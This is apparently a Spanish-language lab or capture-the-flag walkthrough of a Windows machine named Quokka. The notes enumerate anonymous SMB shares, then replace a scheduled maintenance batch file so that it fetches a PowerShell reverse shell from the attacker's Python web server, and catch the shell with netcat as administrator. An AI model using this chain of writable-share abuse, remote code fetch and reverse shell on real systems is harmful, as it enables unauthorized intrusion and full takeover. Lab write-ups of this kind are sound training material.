PORT      STATE SERVICE
80/tcp    open  http
445/tcp   open  microsoft-ds

-Entramos al puerto 80 pero no hay nada interesante

-Enumeramos SMB y encontramos un recurso compartido interesante:
	-smbclient -N -L 192.168.1.139
		Sharename       Type      Comment
		---------       ----      -------
		Compartido      Disk      

-Entramos y analizamos las carpetas, encontrando la siguiente interesante:
	-Entramos: smbclient -N //192.168.1.139/Compartido
	-Navegamos hasta la ruta: \Proyectos\Quokka\Código\>
		-Encontramos archivo mantenimiento.bat (Es un código que hace una petición a un archivo shell.ps1 de un servidor)

-El archivo mantenimiento.bat es una script que se ejecuta cada 1 minuto

-Nos descargamos el archivo y cambiamos el contenido para que haga la petición a nuestro servidor:
	-get mantenimiento.bat
	-nano mantenimiento.bat --> Cambiamos para que haga la petición a 192.168.1.135/shell.ps1

-Borramos el archivo antiguo y subimos el nuevo modificado:
	-del mantenimiento.bat
	-put mantenimiento.bat

-NOTA: Un archivo .ps1 es un archivo que se ejecuta con Powershell

-Nos copiamos la siguiente reverse shell .ps1 , creando el archivo shell.ps1:
	https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1

-Iniciamos un servidor con Python para compartir la reverse shell y recibir la petición y nos ponemos en escucha con Netcat:
	-python -m http.server 80
	-nc -lvnp 1234
	connect to [192.168.1.135] from (UNKNOWN) [192.168.1.139] 49694
	SHELL> whoami
	win-vru3gg3dplj\administrador
	SOMOS ROOT DIRECTAMENTE!!

